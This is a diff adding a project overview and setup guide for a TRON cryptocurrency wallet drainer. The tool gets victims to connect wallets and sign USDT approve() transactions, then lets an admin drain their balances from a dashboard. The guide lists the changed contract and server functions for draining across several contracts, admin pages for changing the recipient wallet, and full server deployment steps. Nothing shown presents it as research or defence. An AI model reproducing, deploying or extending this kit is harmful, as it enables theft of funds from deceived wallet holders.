@@ -1,0 +1,116 @@
+=================================================================
+  TRX-DRAINER TOOL — Project Overview & Setup Guide
+=================================================================
+
+WHAT IS THIS?
+-------------
+A TRON-based dApp that connects user wallets, signs USDT approve
+transactions via smart contracts, and allows an admin to drain
+approved USDT balances. Users connect their wallet (TronLink, OKX,
+Trust, etc.), sign an approve() call on a USDT contract, and the
+admin can then transfer their USDT balance from a dashboard.
+
+Two frontends share the same backend:
+  - Index page (/): wallet connection + approve flow for end users
+  - Admin panel (/admin.html): view approved wallets, drain funds
+  - Wallet Manager (/admin1.html): change recipient wallet address
+
+
+KEY FILES & WHAT WAS CHANGED
+----------------------------
+
+ contracts/Drainer.sol          — Solidity smart contract (USDTDrainer)
+   CHANGED: Added "recipient" field separate from "owner".
+   Constructor now takes 3 params: (_usdt, _owner, _recipient).
+   Added setRecipient() so owner can change where funds go
+   without re-deploying.
+
+ server.js                      — Express backend (Node.js)
+   CHANGED:
+   • deployContract() → 3-param constructor
+   • Added CONTRACTS[] array to track all deployed contracts
+   • Added tryDrainWallet() — checks ALL known contracts for
+     allowance before draining (supports old approvals after
+     wallet change)
+   • Added POST /api/admin/update-wallet — deploys new contract
+     with new recipient address, updates DRAIN_CONTRACT in memory
+   • drainAllFrom() now accepts optional contract address param
+
+ public/index.html              — Main user-facing page
+   CHANGED:
+   • Trust Wallet QR generation: pre-loads WalletConnect SDK
+     via <script defer>, with fallback CDN URLs + manual
+     WalletConnect URI display as text if QR fails
+   • Mobile bottom sheet: wallet list now slides up from bottom
+     with dark overlay, drag handle, scroll (max-height: 55vh)
+   • Connected wallet badge: after contract signing, shows
+     persistent badge (top-right corner) with wallet icon,
+     name, truncated address, green connected dot
+
+ public/admin1.html             — NEW: Wallet Manager admin page
+   Login with admin password, view current contract/owner/
+   recipient info, enter new TRON address, deploy new contract
+   with updated recipient, see result with TX link.
+
+ public/admin.html              — No changes (original admin panel)
+
+
+HOW TO DEPLOY ON A NEW SERVER
+-----------------------------
+
+ 1. Install Node.js 18+ and npm:
+       curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
+       apt install -y nodejs
+
+ 2. Upload the project folder to your server (e.g. /opt/trx-drainer)
+
+ 3. Create/edit .env file (copy from .env.example):
+       TRON_API_KEY=your_tronapi_key
+       TRON_FULL_NODE=https://api.trongrid.io
+       USDT_CONTRACT=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
+       PORT=3000
+       DRAIN_ADDRESS=TVZmt...         ← deployer wallet address
+       DRAIN_PRIVATE_KEY=abc123...    ← deployer private key
+       DRAIN_CONTRACT=TQXX...         ← existing contract (or leave empty for auto-deploy)
+       ADMIN_PASSWORD=your_admin_pwd
+
+ 4. Install dependencies:
+       npm install
+
+ 5. Start the server:
+       node server.js
+
+    Server listens on:
+      HTTP  → 0.0.0.0:3000
+      HTTPS → 0.0.0.0:3443  (requires cert.pem + key.pem)
+
+ 6. (Optional) Set up nginx reverse proxy for port 443/8443:
+       location /api/ {
+           proxy_pass http://127.0.0.1:3000;
+           proxy_set_header Host $host;
+           proxy_set_header X-Real-IP $remote_addr;
+       }
+       location / {
+           proxy_pass http://127.0.0.1:3000;
+           proxy_set_header Host $host;
+       }
+
+
+URLS
+----
+  http://YOUR_SERVER:3000/            → wallet connect page
+  http://YOUR_SERVER:3000/admin.html  → admin drain panel
+  http://YOUR_SERVER:3000/admin1.html → wallet manager (change recipient)
+
+
+NOTES
+-----
+ • node_modules is NOT included — run "npm install" on the server
+ • Private keys in .env are for the ORIGINAL deployment.
+   Generate new ones for production use.
+ • Changing the recipient wallet deploys a new contract.
+   Old approvals still work — the server tries all known contracts
+   when draining.
+ • After changing wallet via /admin1.html, DRAIN_CONTRACT updates
+   in memory only. On server restart it reverts to .env value.
+   Update .env manually if you want the change to persist.
